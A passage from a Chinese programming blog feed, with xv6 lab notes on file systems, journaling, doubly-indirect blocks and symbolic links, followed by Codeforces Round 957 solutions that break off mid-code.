        <content type="html"><![CDATA[<h1 id="lab9"><a href="#lab9" class="headerlink" title="lab9"></a>lab9</h1><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>文件系统API</p><ul><li><p>文件描述符必须与文件名无关（修改文件名后仍然可以通过文件描述符操作文件）</p></li><li><p>记录offset（当前读写位置）</p></li><li><p>友好的文件名</p></li><li><p>在用户/进程间共享文件</p></li><li>持久性</li></ul><p>inode满足以下两种条件时可以删除文件</p><ul><li>link count == 0</li><li>open fd count == 0</li></ul><p>Bcache</p><ul><li><p>在内存中只有一个副本</p></li><li><p>通过维护bcache锁维持bcache链表的一致性，维护buffer睡眠锁实现只有一个进程能修改该块。</p></li><li><p>通过睡眠锁来节省因磁盘访问速度而浪费的CPU时间</p></li><li><p>通过LRU策略将最近使用的块（引用归0）置于bcache链表前。因为最近用过的块可能会在未来的时间继续使用。</p></li></ul><p>文件崩溃的安全性：系统崩溃或断电</p><p>解决方案：<code>日志系统</code></p><ul><li>使系统调用是<code>原子</code>性的，例如是否发生了open</li><li>快速修复</li><li>高性能</li></ul><p>日志系统行为（即<code>事务</code>）</p><ul><li><p>它们要么全部成功执行，要么全部失败。即原子的。</p></li><li><p>将事务中的所有操作记录到日志文件中。</p></li><li>在记录日志后，系统开始执行事务中的操作。</li><li>若系统崩溃，重新执行日志内容。<code>（REDO）（幂等性）</code></li><li><p>清除日志，若完成操作，清除日志。</p></li><li><p>幂等性：指的是一个操作执行多次和执行一次的效果相同，即多次执行的结果不会因为执行次数的增加而改变。</p></li></ul><h3 id="FILE-SYSTEM-ext3"><a href="#FILE-SYSTEM-ext3" class="headerlink" title="FILE SYSTEM ext3"></a>FILE SYSTEM ext3</h3><p><code>write-ahead rule</code>： 预先声明更新在将更新写入磁盘前</p><p><code>freeing rule</code>：我们不能在写入磁盘前覆盖重用日志</p><ul><li>log super block：保存第一个事务的偏移</li><li>…</li><li>describe block：块编号</li><li>log block：日志</li><li>commit block：提交块</li><li>….</li></ul><ul><li><code>异步ASYNC</code><ul><li>优势<ul><li>I/O CONCURRENCY：允许计算和文件写入并行</li><li>HELP BATCHING：为批处理提供支持</li></ul></li><li>劣势<ul><li>不能保证操作已完成，可能导致<code>数据丢失</code></li></ul></li><li>unix提供<code>fsync()强制写入</code>避免异步写入导致的数据丢失</li></ul></li><li><code>批处理BATCHING</code><ul><li>one  “OPEN” action：降低磁盘寻道时间等访问磁盘的开销</li><li>WRITE ABSORBTION：在内存上将多个inode写入一个块显然比一次次在磁盘写入快</li><li>DISK SCHEDUING：允许对磁盘访问进行排序，加快磁盘（特别是机械硬盘）的访问速度</li></ul></li><li><code>并发CONCURRENCE</code><ul><li>SYS CALLS  IN PARALLEL：系统调用可以修改事务</li><li>MANY OLDER XACTIONS<ul><li>ONE OPEN</li><li>COMMITING TO LOG</li><li>WRITING TO HEOME</li><li>FREED</li></ul></li></ul></li></ul><ul><li><strong>Journaled Data</strong> 侧重于通过记录操作日志来保护数据不受系统故障的影响。</li><li><strong>Ordered Data</strong> 侧重于数据的逻辑顺序，这有助于提高数据处理效率和保证数据的一致性。</li></ul><h3 id="Large-files-moderate"><a href="#Large-files-moderate" class="headerlink" title="Large files(moderate)"></a>Large files(moderate)</h3><p>在fs.h修改文件</p><p>块组合为：11+512+512*512</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NDIRECT 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDIRECT (BSIZE / sizeof(uint))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDIRECT2 (NINDIRECT * NINDIRECT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// On-disk inode structure</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dinode</span> &#123;</span><br><span class="line">  <span class="type">short</span> type;           <span class="comment">// File type</span></span><br><span class="line">  <span class="type">short</span> major;          <span class="comment">// Major device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> minor;          <span class="comment">// Minor device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> nlink;          <span class="comment">// Number of links to inode in file system</span></span><br><span class="line">  uint size;            <span class="comment">// Size of file (bytes)</span></span><br><span class="line">  uint addrs[NDIRECT<span class="number">+2</span>];   <span class="comment">// Data block addresses</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同时修改file.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">inode</span> &#123;</span><br><span class="line">  uint dev;           <span class="comment">// Device number</span></span><br><span class="line">  uint inum;          <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">int</span> ref;            <span class="comment">// Reference count</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sleeplock</span> lock; <span class="comment">// protects everything below here</span></span><br><span class="line">  <span class="type">int</span> valid;          <span class="comment">// inode has been read from disk?</span></span><br><span class="line"></span><br><span class="line">  <span class="type">short</span> type;         <span class="comment">// copy of disk inode</span></span><br><span class="line">  <span class="type">short</span> major;</span><br><span class="line">  <span class="type">short</span> minor;</span><br><span class="line">  <span class="type">short</span> nlink;</span><br><span class="line">  uint size;</span><br><span class="line">  uint addrs[NDIRECT<span class="number">+2</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>取bn的索引和偏移，像页表那样，只为分配的inode分配块</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> uint</span></span><br><span class="line"><span class="function"><span class="title">bmap</span><span class="params">(<span class="keyword">struct</span> inode *ip, uint bn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint addr, *a;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *bp;</span><br><span class="line">  uint idx, offset;</span><br><span class="line"> </span><br><span class="line">  ....</span><br><span class="line">    </span><br><span class="line">  bn-= NINDIRECT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bn &lt; NINDIRECT2)&#123;</span><br><span class="line">        idx = bn / NINDIRECT;</span><br><span class="line">        offset = bn % NINDIRECT;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT + <span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT + <span class="number">1</span>] = addr = <span class="built_in">balloc</span>(ip-&gt;dev);    <span class="comment">//分配一级索引块</span></span><br><span class="line">    bp = <span class="built_in">bread</span>(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[idx]) == <span class="number">0</span>)&#123;     <span class="comment">//分配二级索引块</span></span><br><span class="line">      a[idx] = addr = <span class="built_in">balloc</span>(ip-&gt;dev);</span><br><span class="line">      <span class="built_in">log_write</span>(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">brelse</span>(bp);</span><br><span class="line">    bp = <span class="built_in">bread</span>(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[offset]) == <span class="number">0</span>)&#123;    <span class="comment">//分配块</span></span><br><span class="line">      a[offset] = addr = <span class="built_in">balloc</span>(ip-&gt;dev);</span><br><span class="line">      <span class="built_in">log_write</span>(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">brelse</span>(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">panic</span>(<span class="string">&quot;bmap: out of range&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放掉所有子块后才释放上一级块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">itrunc</span><span class="params">(<span class="keyword">struct</span> inode *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i, j;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *bp, *bp1;</span><br><span class="line">  uint *a, *a1;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ip-&gt;addrs[NDIRECT<span class="number">+1</span>])&#123;</span><br><span class="line">    bp = <span class="built_in">bread</span>(ip-&gt;dev, ip-&gt;addrs[NDIRECT<span class="number">+1</span>]);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; NINDIRECT; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(a[j])&#123;</span><br><span class="line">          bp1 = <span class="built_in">bread</span>(ip-&gt;dev, a[j]);</span><br><span class="line">          a1 = (uint*)bp1-&gt;data;</span><br><span class="line">          <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NINDIRECT; i++)</span><br><span class="line">          &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(a1[i])</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">bfree</span>(ip-&gt;dev, a1[i]);  </span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">brelse</span>(bp1);</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">brelse</span>(bp);</span><br><span class="line">    <span class="built_in">bfree</span>(ip-&gt;dev, ip-&gt;addrs[NDIRECT<span class="number">+1</span>]);</span><br><span class="line">    ip-&gt;addrs[NDIRECT<span class="number">+1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  ip-&gt;size = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">iupdate</span>(ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Symbolic-links-moderate"><a href="#Symbolic-links-moderate" class="headerlink" title="Symbolic links(moderate)"></a>Symbolic links(moderate)</h3><p>系统调用添加过程这里就不赘述了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加标志</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_NOFOLLOW 0x800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_SYMLINK 4   <span class="comment">//符号链接</span></span></span><br></pre></td></tr></table></figure><p>在sysfile文件添加sys_symlink()，创建文件并写入T_SYMLINK 标志和指向的文件路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">int64</span></span><br><span class="line"><span class="function"><span class="title">sys_symlink</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> target[MAXPATH], path[MAXPATH];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">inode</span> *dp;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argstr</span>(<span class="number">0</span>, target, MAXPATH) &lt; <span class="number">0</span> || <span class="built_in">argstr</span>(<span class="number">1</span>, path, MAXPATH) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">begin_op</span>();</span><br><span class="line">  <span class="keyword">if</span>((dp = <span class="built_in">create</span>(path, T_SYMLINK, <span class="number">0</span>, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">end_op</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">writei</span>(dp, <span class="number">0</span>, (uint64)target, <span class="number">0</span>, MAXPATH) &lt; MAXPATH)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">iunlockput</span>(dp);</span><br><span class="line">      <span class="built_in">end_op</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">iunlockput</span>(dp);</span><br><span class="line">    <span class="built_in">end_op</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当文件类型为符号链接且O_NOFOLLOW未被设置访问指向的路径，同时当循环深度大于10时，返回错误，避免环状引用无法退出open。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_open</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ip-&gt;type == T_DEVICE &amp;&amp; (ip-&gt;major &lt; <span class="number">0</span> || ip-&gt;major &gt;= NDEV))&#123;</span><br><span class="line">    <span class="built_in">iunlockput</span>(ip);</span><br><span class="line">    <span class="built_in">end_op</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ip-&gt;type == T_SYMLINK &amp;&amp; !(omode &amp; O_NOFOLLOW))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">readi</span>(ip, <span class="number">0</span>, (uint64)path, <span class="number">0</span>, MAXPATH) != MAXPATH)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">iunlockput</span>(ip);</span><br><span class="line">      <span class="built_in">end_op</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">iunlockput</span>(ip);</span><br><span class="line">      ip = <span class="built_in">namei</span>(path);</span><br><span class="line">      <span class="keyword">if</span>(ip == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">end_op</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">ilock</span>(ip);</span><br><span class="line">      <span class="keyword">if</span>(ip-&gt;type != T_SYMLINK)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;type == T_SYMLINK) &#123;</span><br><span class="line">      <span class="built_in">iunlockput</span>(ip);</span><br><span class="line">      <span class="built_in">end_op</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 957 (Div. 3)</title>
      <link href="/2024/07/12/codeforce/2024_7_11/"/>
      <url>/2024/07/12/codeforce/2024_7_11/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712171214258.png" alt="image-20240712171214258"></p><p>题目大意是对输入的a,b,c三个数，每个数可以自增，但是总自增值不得大于5。求$a<em>b</em>c$的最大值。</p><p>这题直接使用暴力做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num[<span class="number">3</span>][<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; num[<span class="number">0</span>][i] &gt;&gt; num[<span class="number">1</span>][i] &gt;&gt; num[<span class="number">2</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> maxnum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span>; a &lt;= <span class="number">5</span>; a++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; a + b &lt;= <span class="number">5</span>; b++) &#123;</span><br><span class="line">                <span class="type">int</span> c = <span class="number">5</span> - a - b;</span><br><span class="line">                <span class="type">int</span> tmp = (num[<span class="number">0</span>][i] + a) * (num[<span class="number">1</span>][i] + b) * (num[<span class="number">2</span>][i] + c);</span><br><span class="line">                maxnum = <span class="built_in">max</span>(tmp, maxnum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; maxnum &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712194433639.png" alt="image-20240712194433639"></p><p>题目大意是将所有数加在一起，但是每次只能减一或加一，求最小的加减次数。</p><p>这题可以使用栈来做，但是时间应该会超，因此采用模拟。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> arr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t;</span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="type">int</span> n, k;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">      cin &gt;&gt; arr[i];</span><br><span class="line">    <span class="built_in">sort</span>(arr, arr + k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k - <span class="number">1</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i] == <span class="number">1</span>)</span><br><span class="line">        cnt++;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> tmp = <span class="number">0</span>; <span class="comment">//移动次数</span></span><br><span class="line">        <span class="keyword">while</span> (arr[i] != <span class="number">1</span>) &#123;</span><br><span class="line">          arr[i]--;</span><br><span class="line">          cnt++;</span><br><span class="line">          tmp++;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt += tmp + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712194526427.png" alt="image-20240712194526427"></p><p>题目要求是求出<code>f-g</code>的最大值，这题我们可以根据答案写题解。</p><p>答案主要分为三段</p><ul><li><p>在n——k，我们需要放入大于k的数，同时，由于f函数是累加的，我们需要从大到小排列，</p></li><li><p>在k——m，我们需要放入大于k小于m的数，这里可以随意排列（对函数的值无影响）</p></li><li><p>在1——k，由于我们要让g函数值最小，因此应该让越大的数排在越后面（被累加的次数越小）。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t;</span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="type">int</span> n, m, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">    <span class="type">int</span> num = n;</span><br><span class="line">    <span class="keyword">while</span> (num &gt;= k) &#123;</span><br><span class="line"></span><br><span class="line">      cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">      num--;</span><br><span class="line">    &#125;</span><br><span class="line">    num = m + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &lt; k) &#123;</span><br><span class="line">      cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &lt;= m) &#123;</span><br><span class="line">      cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712194935395.png" alt="image-20240712194935395"></p><p>题意大抵是，小伙子为了追寻爱，需要越过n米河流，它可以跳过m米，也可以在水里游k米（注意这里指的是可以游的总距离）。</p><p>第一次cf止步于此，也是看了下<a href="https://www.youtube.com/watch?v=9Vv2ZukG1CM&amp;t=2476s">Neal</a>的题解，发现这题是用贪心做的，跳跃应该从后往前枚举（游最短的距离），用swim记录游泳距离。同时，在字符串前后添加字符，解决了边界问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 